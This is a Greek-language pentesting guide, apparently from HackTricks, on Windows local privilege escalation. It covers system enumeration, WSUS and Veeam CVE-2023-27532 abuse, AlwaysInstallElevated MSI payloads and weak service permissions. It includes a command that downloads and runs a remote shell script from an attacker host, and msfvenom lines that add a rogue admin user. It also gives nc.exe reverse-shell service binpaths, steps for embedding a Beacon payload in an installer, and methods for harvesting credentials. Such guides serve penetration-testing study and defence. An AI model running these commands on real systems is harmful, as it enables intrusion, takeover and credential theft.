# Windows Local Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

### **Καλύτερο εργαλείο για να εντοπίσετε Windows local privilege escalation vectors:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

## Αρχική Windows Θεωρία

### Access Tokens

**Αν δεν ξέρετε τι είναι τα Windows Access Tokens, διαβάστε την παρακάτω σελίδα πριν συνεχίσετε:**


{{#ref}}
access-tokens.md
{{#endref}}

### ACLs - DACLs/SACLs/ACEs

**Ελέγξτε την παρακάτω σελίδα για περισσότερες πληροφορίες σχετικά με τα ACLs - DACLs/SACLs/ACEs:**


{{#ref}}
acls-dacls-sacls-aces.md
{{#endref}}

### Integrity Levels

**Αν δεν ξέρετε τι είναι τα integrity levels στα Windows, θα πρέπει να διαβάσετε την παρακάτω σελίδα πριν συνεχίσετε:**


{{#ref}}
integrity-levels.md
{{#endref}}

## Windows Security Controls

Υπάρχουν διάφορα πράγματα στα Windows που θα μπορούσαν να **σας εμποδίσουν να κάνετε enumeration του συστήματος**, να εκτελέσετε executables ή ακόμα και να **ανιχνεύσουν τις ενέργειές σας**. Θα πρέπει να **διαβάσετε** την παρακάτω **σελίδα** και να **κάνετε enumeration** όλων αυτών των **defenses** **mechanisms** πριν ξεκινήσετε το privilege escalation enumeration:


{{#ref}}
../authentication-credentials-uac-and-efs/
{{#endref}}

### Admin Protection / UIAccess silent elevation

Τα UIAccess processes που εκκινούν μέσω `RAiLaunchAdminProcess` μπορούν να abused για να φτάσουν σε High IL χωρίς prompts όταν παρακαμφθούν οι AppInfo secure-path checks. Δείτε εδώ το dedicated UIAccess/Admin Protection bypass workflow:

{{#ref}}
uiaccess-admin-protection-bypass.md
{{#endref}}

Το Secure Desktop accessibility registry propagation μπορεί να abused για ένα arbitrary SYSTEM registry write (RegPwn):

{{#ref}}
secure-desktop-accessibility-registry-propagation-regpwn.md
{{#endref}}

Οι πρόσφατες Windows builds επίσης εισήγαγαν μια διαδρομή LPE με **SMB arbitrary-port** όπου μια privileged local NTLM authentication αντανακλάται μέσω μιας reused SMB TCP connection:

{{#ref}}
local-ntlm-reflection-via-smb-arbitrary-port.md
{{#endref}}

## System Info

### Version info enumeration

Ελέγξτε αν η Windows έκδοση έχει κάποια γνωστή ευπάθεια (ελέγξτε επίσης τα patches που έχουν εφαρμοστεί).
```bash
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" #Get only that information
wmic qfe get Caption,Description,HotFixID,InstalledOn #Patches
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE% #Get system architecture
```

```bash
[System.Environment]::OSVersion.Version #Current OS version
Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid} #List all patches
Get-Hotfix -description "Security update" #List only "Security Update" patches
```
### Exploits Εκδόσεων

Αυτό το [site](https://msrc.microsoft.com/update-guide/vulnerability) είναι χρήσιμο για αναζήτηση λεπτομερών πληροφοριών σχετικά με ευπάθειες ασφαλείας της Microsoft. Αυτή η βάση δεδομένων έχει περισσότερες από 4,700 ευπάθειες ασφαλείας, δείχνοντας τη **μαζική attack surface** που παρουσιάζει ένα Windows environment.

**Στο σύστημα**

- _post/windows/gather/enum_patches_
- _post/multi/recon/local_exploit_suggester_
- [_watson_](https://github.com/rasta-mouse/Watson)
- [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) _(Winpeas has watson embedded)_

**Τοπικά με system information**

- [https://github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
- [https://github.com/bitsadmin/wesng](https://github.com/bitsadmin/wesng)

**Github repos of exploits:**

- [https://github.com/nomi-sec/PoC-in-GitHub](https://github.com/nomi-sec/PoC-in-GitHub)
- [https://github.com/abatchy17/WindowsExploits](https://github.com/abatchy17/WindowsExploits)
- [https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)

### Environment

Υπάρχει κάποια credential/Juicy info αποθηκευμένη στις env variables;
```bash
set
dir env:
Get-ChildItem Env: | ft Key,Value -AutoSize
```
### Ιστορικό PowerShell
```bash
ConsoleHost_history #Find the PATH where is saved

type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
cat (Get-PSReadlineOption).HistorySavePath
cat (Get-PSReadlineOption).HistorySavePath | sls passw
```
### Αρχεία PowerShell Transcript

Μπορείτε να μάθετε πώς να το ενεργοποιήσετε στο [https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/](https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/)
```bash
#Check is enable in the registry
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
dir C:\Transcripts

#Start a Transcription session
Start-Transcript -Path "C:\transcripts\transcript0.txt" -NoClobber
Stop-Transcript
```
### Καταγραφή PowerShell Module

Καταγράφονται λεπτομέρειες των εκτελέσεων του PowerShell pipeline, συμπεριλαμβανομένων των εκτελεσμένων commands, των invocations των commands και τμημάτων των scripts. Ωστόσο, είναι πιθανό να μην καταγράφονται πλήρεις λεπτομέρειες εκτέλεσης και τα αποτελέσματα output.

Για να το ενεργοποιήσεις, ακολούθησε τις οδηγίες στην ενότητα "Transcript files" της documentation, επιλέγοντας **"Module Logging"** αντί για **"Powershell Transcription"**.
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
```
Για να προβάλετε τα τελευταία 15 events από τα PowersShell logs μπορείτε να εκτελέσετε:
```bash
Get-WinEvent -LogName "windows Powershell" | select -First 15 | Out-GridView
```
### PowerShell **Script Block Logging**

Καταγράφεται μια πλήρης καταγραφή δραστηριότητας και πλήρες περιεχόμενο της εκτέλεσης του script, διασφαλίζοντας ότι κάθε block code τεκμηριώνεται καθώς εκτελείται. Αυτή η διαδικασία διατηρεί ένα ολοκληρωμένο audit trail κάθε δραστηριότητας, πολύτιμο για forensics και την ανάλυση κακόβουλης συμπεριφοράς. Με την τεκμηρίωση όλης της δραστηριότητας τη στιγμή της εκτέλεσης, παρέχονται λεπτομερείς πληροφορίες για τη διαδικασία.
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
```
Τα συμβάντα καταγραφής για το Script Block μπορούν να βρεθούν στο Windows Event Viewer στη διαδρομή: **Application and Services Logs > Microsoft > Windows > PowerShell > Operational**.\
Για να δείτε τα τελευταία 20 συμβάντα μπορείτε να χρησιμοποιήσετε:
```bash
Get-WinEvent -LogName "Microsoft-Windows-Powershell/Operational" | select -first 20 | Out-Gridview
```
### Ρυθμίσεις Internet
```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
```
### Δίσκοι
```bash
wmic logicaldisk get caption || fsutil fsinfo drives
wmic logicaldisk get caption,description,providername
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
```
## WSUS

Μπορείτε να παραβιάσετε το σύστημα αν οι ενημερώσεις δεν ζητούνται μέσω http**S** αλλά μέσω http.

Ξεκινάτε ελέγχοντας αν το δίκτυο χρησιμοποιεί WSUS ενημέρωση χωρίς SSL εκτελώντας τα παρακάτω στο cmd:
```
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
```
Ή τα ακόλουθα σε PowerShell:
```
Get-ItemProperty -Path HKLM:\Software\Policies\Microsoft\Windows\WindowsUpdate -Name "WUServer"
```
Αν λάβετε μια απάντηση όπως μία από αυτές:
```bash
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
WUServer    REG_SZ    http://xxxx-updxx.corp.internal.com:8535
```

```bash
WUServer     : http://xxxx-updxx.corp.internal.com:8530
PSPath       : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows\windowsupdate
PSParentPath : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows
PSChildName  : windowsupdate
PSDrive      : HKLM
PSProvider   : Microsoft.PowerShell.Core\Registry
```
Και αν `HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer` ή `Get-ItemProperty -Path hklm:\software\policies\microsoft\windows\windowsupdate\au -name "usewuserver"` είναι ίσο με `1`.

Τότε, **είναι exploitable.** Αν το τελευταίο registry είναι ίσο με 0, τότε η εγγραφή WSUS θα αγνοηθεί.

Για να exploit this vulnerabilities μπορείς να χρησιμοποιήσεις tools όπως: [Wsuxploit](https://github.com/pimps/wsuxploit), [pyWSUS ](https://github.com/GoSecure/pywsus)- Αυτά είναι MiTM weaponized exploits scripts για να inject 'fake' updates σε non-SSL WSUS traffic.

Διάβασε το research εδώ:

{{#file}}
CTX_WSUSpect_White_Paper (1).pdf
{{#endfile}}

**WSUS CVE-2020-1013**

[**Read the complete report here**](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/).\
Βασικά, αυτή είναι η flaw που αυτό το bug exploit:

> Αν έχουμε τη δύναμη να modify το local user proxy μας, και το Windows Updates χρησιμοποιεί το proxy που έχει ρυθμιστεί στις Internet Explorer settings, τότε έχουμε τη δύναμη να τρέξουμε [PyWSUS](https://github.com/GoSecure/pywsus) locally για να intercept το δικό μας traffic και να τρέξουμε code ως elevated user στο asset μας.
>
> Επιπλέον, αφού η WSUS service χρησιμοποιεί τις ρυθμίσεις του current user, θα χρησιμοποιεί επίσης και το certificate store του. Αν δημιουργήσουμε ένα self-signed certificate για το WSUS hostname και προσθέσουμε αυτό το certificate στο certificate store του current user, θα μπορούμε να intercept τόσο HTTP όσο και HTTPS WSUS traffic. Το WSUS δεν χρησιμοποιεί HSTS-like mechanisms για να υλοποιήσει έναν trust-on-first-use τύπου validation στο certificate. Αν το certificate που παρουσιάζεται είναι trusted από τον user και έχει το σωστό hostname, θα γίνει accepted by the service.

Μπορείς να exploit this vulnerability χρησιμοποιώντας το tool [**WSUSpicious**](https://github.com/GoSecure/wsuspicious) (μόλις απελευθερωθεί).

## Third-Party Auto-Updaters and Agent IPC (local privesc)

Πολλά enterprise agents εκθέτουν ένα localhost IPC surface και ένα privileged update channel. Αν το enrollment μπορεί να εξαναγκαστεί σε attacker server και το updater trusts ένα rogue root CA ή weak signer checks, ένας local user μπορεί να παραδώσει ένα malicious MSI που η SYSTEM service εγκαθιστά. Δες μια generalized technique (based on the Netskope stAgentSvc chain – CVE-2025-0309) εδώ:


{{#ref}}
abusing-auto-updaters-and-ipc.md
{{#endref}}

## Veeam Backup & Replication CVE-2023-27532 (SYSTEM via TCP 9401)

Το Veeam B&R < `11.0.1.1261` εκθέτει μια localhost service στο **TCP/9401** που επεξεργάζεται attacker-controlled μηνύματα, επιτρέποντας arbitrary commands ως **NT AUTHORITY\SYSTEM**.

- **Recon**: επιβεβαίωσε τον listener και την έκδοση, π.χ. `netstat -ano | findstr 9401` και `(Get-Item "C:\Program Files\Veeam\Backup and Replication\Backup\Veeam.Backup.Shell.exe").VersionInfo.FileVersion`.
- **Exploit**: τοποθέτησε ένα PoC όπως `VeeamHax.exe` με τα απαιτούμενα Veeam DLLs στον ίδιο κατάλογο, και μετά trigger ένα SYSTEM payload μέσω του local socket:
```powershell
.\VeeamHax.exe --cmd "powershell -ep bypass -c \"iex(iwr http://attacker/shell.ps1 -usebasicparsing)\""
```
Η υπηρεσία εκτελεί την εντολή ως SYSTEM.
## KrbRelayUp

Υπάρχει μια ευπάθεια **local privilege escalation** σε περιβάλλοντα Windows **domain** υπό συγκεκριμένες συνθήκες. Αυτές οι συνθήκες περιλαμβάνουν περιβάλλοντα όπου το **LDAP signing** δεν επιβάλλεται, οι χρήστες διαθέτουν self-rights που τους επιτρέπουν να διαμορφώσουν **Resource-Based Constrained Delegation (RBCD),** και τη δυνατότητα για τους χρήστες να δημιουργούν computers μέσα στο domain. Είναι σημαντικό να σημειωθεί ότι αυτές οι **requirements** ικανοποιούνται με τις **default settings**.

Βρες το **exploit in** [**https://github.com/Dec0ne/KrbRelayUp**](https://github.com/Dec0ne/KrbRelayUp)

Για περισσότερες πληροφορίες σχετικά με τη ροή της επίθεσης, δες [https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/)

## AlwaysInstallElevated

**Αν** αυτά τα 2 registers είναι **enabled** (η τιμή είναι **0x1**), τότε οι χρήστες οποιουδήποτε privilege μπορούν να **install** (execute) `*.msi` files ως NT AUTHORITY\\**SYSTEM**.
```bash
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```
### Payloads Metasploit
```bash
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi #No uac format
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi #Using the msiexec the uac wont be prompted
```
If you have a meterpreter session you can automate this technique using the module **`exploit/windows/local/always_install_elevated`**

### PowerUP

Χρησιμοποιήστε την εντολή `Write-UserAddMSI` από το power-up για να δημιουργήσετε μέσα στον τρέχοντα κατάλογο ένα Windows MSI binary για privilege escalation. Αυτό το script γράφει ένα precompiled MSI installer που ζητά προσθήκη user/group (οπότε θα χρειαστείτε GIU access):
```
Write-UserAddMSI
```
Εκτέλεσε απλώς το δημιουργημένο binary για να κλιμακώσεις δικαιώματα.

### MSI Wrapper

Διάβασε αυτό το tutorial για να μάθεις πώς να δημιουργήσεις ένα MSI wrapper χρησιμοποιώντας αυτά τα tools. Σημείωσε ότι μπορείς να κάνεις wrap ένα "**.bat**" file αν απλώς θέλεις να **εκτελέσεις** **command lines**


{{#ref}}
msi-wrapper.md
{{#endref}}

### Create MSI with WIX


{{#ref}}
create-msi-with-wix.md
{{#endref}}

### Create MSI with Visual Studio

- **Generate** με Cobalt Strike ή Metasploit ένα **new Windows EXE TCP payload** στο `C:\privesc\beacon.exe`
- Άνοιξε το **Visual Studio**, επίλεξε **Create a new project** και πληκτρολόγησε "installer" στο search box. Επίλεξε το project **Setup Wizard** και κάνε κλικ στο **Next**.
- Δώσε στο project ένα όνομα, όπως **AlwaysPrivesc**, χρησιμοποίησε το **`C:\privesc`** ως location, επίλεξε **place solution and project in the same directory**, και κάνε κλικ στο **Create**.
- Συνέχισε να κάνεις κλικ στο **Next** μέχρι να φτάσεις στο βήμα 3 από 4 (choose files to include). Κάνε κλικ στο **Add** και επίλεξε το Beacon payload που μόλις δημιούργησες. Μετά κάνε κλικ στο **Finish**.
- Επίλεξε το project **AlwaysPrivesc** στο **Solution Explorer** και στις **Properties**, άλλαξε το **TargetPlatform** από **x86** σε **x64**.
- Υπάρχουν και άλλες properties που μπορείς να αλλάξεις, όπως το **Author** και το **Manufacturer**, που μπορούν να κάνουν την εγκατεστημένη εφαρμογή να φαίνεται πιο νόμιμη.
- Κάνε δεξί κλικ στο project και επίλεξε **View > Custom Actions**.
- Κάνε δεξί κλικ στο **Install** και επίλεξε **Add Custom Action**.
- Κάνε διπλό κλικ στο **Application Folder**, επίλεξε το αρχείο σου **beacon.exe** και κάνε κλικ στο **OK**. Αυτό θα διασφαλίσει ότι το beacon payload εκτελείται μόλις τρέξει ο installer.
- Στις **Custom Action Properties**, άλλαξε το **Run64Bit** σε **True**.
- Τέλος, **build it**.
- Αν εμφανιστεί η προειδοποίηση `File 'beacon-tcp.exe' targeting 'x64' is not compatible with the project's target platform 'x86'`, βεβαιώσου ότι έχεις ορίσει την platform σε x64.

### MSI Installation

Για να εκτελέσεις την **installation** του κακόβουλου `.msi` file στο **background:**
```
msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\alwe.msi
```
Για να εκμεταλλευτείς αυτήν την ευπάθεια μπορείς να χρησιμοποιήσεις: _exploit/windows/local/always_install_elevated_

## Antivirus and Detectors

### Audit Settings

Αυτές οι ρυθμίσεις καθορίζουν τι καταγράφεται, οπότε θα πρέπει να δώσεις προσοχή
```
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit
```
### WEF

Το Windows Event Forwarding είναι χρήσιμο να ξέρετε πού αποστέλλονται τα logs
```bash
reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager
```
### LAPS

**LAPS** έχει σχεδιαστεί για τη **διαχείριση των κωδικών πρόσβασης του τοπικού Administrator**, διασφαλίζοντας ότι κάθε κωδικός είναι **μοναδικός, τυχαίος και ενημερώνεται τακτικά** σε υπολογιστές που είναι ενταγμένοι σε domain. Αυτοί οι κωδικοί αποθηκεύονται με ασφάλεια στο Active Directory και μπορούν να προσπελαστούν μόνο από χρήστες στους οποίους έχουν δοθεί επαρκή δικαιώματα μέσω ACLs, επιτρέποντάς τους να βλέπουν τους local admin passwords αν είναι εξουσιοδοτημένοι.


{{#ref}}
../active-directory-methodology/laps.md
{{#endref}}

### WDigest

Αν είναι ενεργό, **plain-text passwords are stored in LSASS** (Local Security Authority Subsystem Service).\
[**More info about WDigest in this page**](../stealing-credentials/credentials-protections.md#wdigest).
```bash
reg query 'HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' /v UseLogonCredential
```
### LSA Protection

Ξεκινώντας με τα **Windows 8.1**, η Microsoft εισήγαγε ενισχυμένη προστασία για το Local Security Authority (LSA) ώστε να **μπλοκάρει** προσπάθειες από μη αξιόπιστες διεργασίες να **διαβάσουν τη μνήμη του** ή να inject code, ενισχύοντας περαιτέρω την ασφάλεια του συστήματος.\
[**Περισσότερες πληροφορίες για το LSA Protection εδώ**](../stealing-credentials/credentials-protections.md#lsa-protection).
```bash
reg query 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA' /v RunAsPPL
```
### Credentials Guard

**Credential Guard** εισήχθη στα **Windows 10**. Σκοπός του είναι να προστατεύει τα credentials που είναι αποθηκευμένα σε μια συσκευή από απειλές όπως οι επιθέσεις pass-the-hash.| [**More info about Credentials Guard here.**](../stealing-credentials/credentials-protections.md#credential-guard)
```bash
reg query 'HKLM\System\CurrentControlSet\Control\LSA' /v LsaCfgFlags
```
### Cached Credentials

**Τα διαπιστευτήρια τομέα** αυθεντικοποιούνται από το **Local Security Authority** (LSA) και χρησιμοποιούνται από τα στοιχεία του λειτουργικού συστήματος. Όταν τα δεδομένα σύνδεσης ενός χρήστη αυθεντικοποιούνται από ένα καταχωρημένο security package, συνήθως δημιουργούνται domain credentials για τον χρήστη.\
[**Περισσότερες πληροφορίες για τα Cached Credentials εδώ**](../stealing-credentials/credentials-protections.md#cached-credentials).
```bash
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON" /v CACHEDLOGONSCOUNT
```
## Χρήστες & Ομάδες

### Απαρίθμηση Χρηστών & Ομάδων

Θα πρέπει να ελέγξεις αν κάποια από τις ομάδες στις οποίες ανήκεις έχει ενδιαφέροντα permissions
```bash
# CMD
net users %username% #Me
net users #All local users
net localgroup #Groups
net localgroup Administrators #Who is inside Administrators group
whoami /all #Check the privileges

# PS
Get-WmiObject -Class Win32_UserAccount
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
```
### Privileged groups

Αν **ανήκεις σε κάποια privileged group, μπορεί να μπορέσεις να κάνεις escalate privileges**. Μάθε για τα privileged groups και πώς να τα abuse για να κάνεις escalate privileges εδώ:


{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### Token manipulation

**Μάθε περισσότερα** για το τι είναι ένα **token** σε αυτή τη σελίδα: [**Windows Tokens**](../authentication-credentials-uac-and-efs/index.html#access-tokens).\
Έλεγξε την ακόλουθη σελίδα για να **μάθεις για ενδιαφέροντα tokens** και πώς να τα abuse:


{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

### Logged users / Sessions
```bash
qwinsta
klist sessions
```
### Φάκελοι Home
```bash
dir C:\Users
Get-ChildItem C:\Users
```
### Πολιτική κωδικών πρόσβασης
```bash
net accounts
```
### Λήψη του περιεχομένου του clipboard
```bash
powershell -command "Get-Clipboard"
```
## Running Processes

### File and Folder Permissions

Πρώτα απ' όλα, καταγράφοντας τις διεργασίες **έλεγξε για passwords μέσα στη command line της διεργασίας**.\
Έλεγξε αν μπορείς να **αντικαταστήσεις κάποιο binary που τρέχει** ή αν έχεις δικαιώματα εγγραφής στον φάκελο του binary για να εκμεταλλευτείς πιθανές [**DLL Hijacking attacks**](dll-hijacking/index.html):
```bash
Tasklist /SVC #List processes running and services
tasklist /v /fi "username eq system" #Filter "system" processes

#With allowed Usernames
Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize

#Without usernames
Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
```
Να ελέγχετε πάντα για πιθανούς [**electron/cef/chromium debuggers** running, you could abuse it to escalate privileges](../../linux-hardening/privilege-escalation/electron-cef-chromium-debugger-abuse.md).

**Έλεγχος δικαιωμάτων των binaries των processes**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v "system32"^|find ":"') do (
for /f eol^=^"^ delims^=^" %%z in ('echo %%x') do (
icacls "%%z"
2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo.
)
)
```
**Έλεγχος δικαιωμάτων των φακέλων των binaries των διεργασιών (**[**DLL Hijacking**](dll-hijacking/index.html)**)**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v
"system32"^|find ":"') do for /f eol^=^"^ delims^=^" %%y in ('echo %%x') do (
icacls "%%~dpy\" 2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users
todos %username%" && echo.
)
```
### Εξόρυξη κωδικών πρόσβασης από μνήμη

Μπορείς να δημιουργήσεις ένα memory dump ενός ενεργού process χρησιμοποιώντας το **procdump** από τα sysinternals. Υπηρεσίες όπως το FTP έχουν τα **credentials σε clear text στη μνήμη**, δοκίμασε να κάνεις dump τη μνήμη και να διαβάσεις τα credentials.
```bash
procdump.exe -accepteula -ma <proc_name_tasklist>
```
### Insecure GUI apps

**Applications running as SYSTEM may allow an user to spawn a CMD, or browse directories.**

Παράδειγμα: "Windows Help and Support" (Windows + F1), αναζήτησε "command prompt", κάνε click στο "Click to open Command Prompt"

## Services

Τα Service Triggers επιτρέπουν στο Windows να ξεκινά ένα service όταν συμβαίνουν ορισμένες συνθήκες (named pipe/RPC endpoint activity, ETW events, IP availability, device arrival, GPO refresh, etc.). Ακόμα και χωρίς δικαιώματα SERVICE_START, συχνά μπορείς να ξεκινήσεις privileged services ενεργοποιώντας τα triggers τους. Δες εδώ τεχνικές enumeration και activation:

-
{{#ref}}
service-triggers.md
{{#endref}}

Λίστα υπηρεσιών:
```bash
net start
wmic service list brief
sc query
Get-Service
```
### Δικαιώματα

Μπορείτε να χρησιμοποιήσετε το **sc** για να λάβετε πληροφορίες για μια υπηρεσία
```bash
sc qc <service_name>
```
Συνιστάται να έχετε το binary **accesschk** από το _Sysinternals_ για να ελέγξετε το απαιτούμενο επίπεδο δικαιωμάτων για κάθε service.
```bash
accesschk.exe -ucqv <Service_Name> #Check rights for different groups
```
Συνιστάται να ελέγξετε αν οι "Authenticated Users" μπορούν να τροποποιήσουν οποιαδήποτε υπηρεσία:
```bash
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv %USERNAME% * /accepteula
accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula 2>nul
accesschk.exe -uwcqv "Todos" * /accepteula ::Spanish version
```
[Μπορείτε να κατεβάσετε το accesschk.exe για XP από εδώ](https://github.com/ankh2054/windows-pentest/raw/master/Privelege/accesschk-2003-xp.exe)

### Enable service

Αν έχετε αυτό το σφάλμα (για παράδειγμα με SSDPSRV):

_System error 1058 has occurred._\
_The service cannot be started, either because it is disabled or because it has no enabled devices associated with it._

Μπορείτε να το ενεργοποιήσετε χρησιμοποιώντας
```bash
sc config SSDPSRV start= demand
sc config SSDPSRV obj= ".\LocalSystem" password= ""
```
**Λάβετε υπόψη ότι η υπηρεσία upnphost εξαρτάται από το SSDPSRV για να λειτουργήσει (για XP SP1)**

**Μια άλλη λύση** σε αυτό το πρόβλημα είναι η εκτέλεση:
```
sc.exe config usosvc start= auto
```
### **Τροποποίηση διαδρομής binary της υπηρεσίας**

Στο σενάριο όπου η ομάδα "Authenticated users" διαθέτει **SERVICE_ALL_ACCESS** σε μια υπηρεσία, είναι δυνατή η τροποποίηση του εκτελέσιμου binary της υπηρεσίας. Για να τροποποιήσετε και να εκτελέσετε **sc**:
```bash
sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
sc config <Service_Name> binpath= "net localgroup administrators username /add"
sc config <Service_Name> binpath= "cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"

sc config SSDPSRV binpath= "C:\Documents and Settings\PEPE\meter443.exe"
```
### Επανεκκίνηση υπηρεσίας
```bash
wmic service NAMEOFSERVICE call startservice
net stop [service name] && net start [service name]
```
Τα δικαιώματα μπορούν να κλιμακωθούν μέσω διαφόρων permissions:

- **SERVICE_CHANGE_CONFIG**: Επιτρέπει την αναδιαμόρφωση του service binary.
- **WRITE_DAC**: Ενεργοποιεί την αναδιαμόρφωση permissions, οδηγώντας στη δυνατότητα αλλαγής των service configurations.
- **WRITE_OWNER**: Επιτρέπει την απόκτηση ownership και την αναδιαμόρφωση permissions.
- **GENERIC_WRITE**: Κληρονομεί τη δυνατότητα αλλαγής των service configurations.
- **GENERIC_ALL**: Επίσης κληρονομεί τη δυνατότητα αλλαγής των service configurations.

Για τον εντοπισμό και την εκμετάλλευση αυτής της ευπάθειας, το _exploit/windows/local/service_permissions_ μπορεί να χρησιμοποιηθεί.

### Services binaries weak permissions

**Έλεγξε αν μπορείς να τροποποιήσεις το binary που εκτελείται από ένα service** ή αν έχεις **write permissions στον φάκελο** όπου βρίσκεται το binary ([**DLL Hijacking**](dll-hijacking/index.html))**.**\
Μπορείς να βρεις κάθε binary που εκτελείται από ένα service χρησιμοποιώντας **wmic** (όχι στο system32) και να ελέγξεις τα permissions σου χρησιμοποιώντας **icacls**:
```bash
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> %temp%\perm.txt

for /f eol^=^"^ delims^=^" %a in (%temp%\perm.txt) do cmd.exe /c icacls "%a" 2>nul | findstr "(M) (F) :\"
```
Μπορείτε επίσης να χρησιμοποιήσετε **sc** και **icacls**:
```bash
sc query state= all | findstr "SERVICE_NAME:" >> C:\Temp\Servicenames.txt
FOR /F "tokens=2 delims= " %i in (C:\Temp\Servicenames.txt) DO @echo %i >> C:\Temp\services.txt
FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> C:\Temp\path.txt
```
### Δικαιώματα τροποποίησης registry υπηρεσιών

Θα πρέπει να ελέγξετε αν μπορείτε να τροποποιήσετε οποιοδήποτε service registry.\
Μπορείτε να **ελέγξετε** τα **δικαιώματά** σας πάνω σε ένα service **registry** κάνοντας:
```bash
reg query hklm\System\CurrentControlSet\Services /s /v imagepath #Get the binary paths of the services

#Try to write every service with its current content (to check if you have write permissions)
for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\reg.hiv 2>nul & reg save %a %temp%\reg.hiv 2>nul && reg restore %a %temp%\reg.hiv 2>nul && echo You can modify %a

get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "<Username> Users Path Everyone"
```
Θα πρέπει να ελεγχθεί αν οι **Authenticated Users** ή το **NT AUTHORITY\INTERACTIVE** διαθέτουν δικαιώματα `FullControl`. Αν ναι, το binary που εκτελείται από την υπηρεσία μπορεί να τροποποιηθεί.

Για να αλλάξετε το Path του binary που εκτελείται:
```bash
reg add HKLM\SYSTEM\CurrentControlSet\services\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f
```
### Registry symlink race to arbitrary HKLM value write (ATConfig)

